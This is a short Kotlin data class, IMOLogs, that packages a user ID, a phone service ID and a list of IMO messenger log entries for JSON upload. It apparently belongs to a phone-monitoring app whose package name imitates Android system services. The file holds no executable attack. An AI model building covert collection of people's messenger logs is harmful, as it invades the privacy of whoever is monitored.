package com.android.services.models.im

import com.android.services.db.entities.ImoRooted
import com.google.gson.annotations.SerializedName

class IMOLogs {

    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("imoLogs")
    var iMOList: List<ImoRooted>? = null
        private set

    constructor()
    constructor(userId: String?, phoneServiceId: String?, imoUnrootedList: List<ImoRooted>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        iMOList = imoUnrootedList
    }
}